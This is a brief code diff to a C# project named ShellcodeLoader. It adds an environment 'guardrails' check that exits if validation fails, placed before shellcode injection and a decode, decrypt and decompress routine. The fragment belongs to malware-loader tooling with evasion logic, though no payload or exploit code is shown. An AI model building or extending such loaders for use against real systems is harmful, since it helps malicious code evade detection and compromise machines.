@@ -20,6 +20,15 @@ namespace ShellcodeLoader
             DebugLogger.WriteLine($"[+] Initial shellcode size: {shellcode.Length} bytes");
 
             // ============================================================
+            // GUARDRAILS CHECK: Validate environment before injection
+            // ============================================================
+            if (!Guardrails.RunGuardrails())
+            {
+                DebugLogger.WriteLine("[-] Guardrail check failed, exiting!");
+                Environment.Exit(1);
+            }
+
+            // ============================================================
             // DEOBFUSCATION ROUTINE: Decode -> Decrypt -> Decompress
             // ============================================================
 
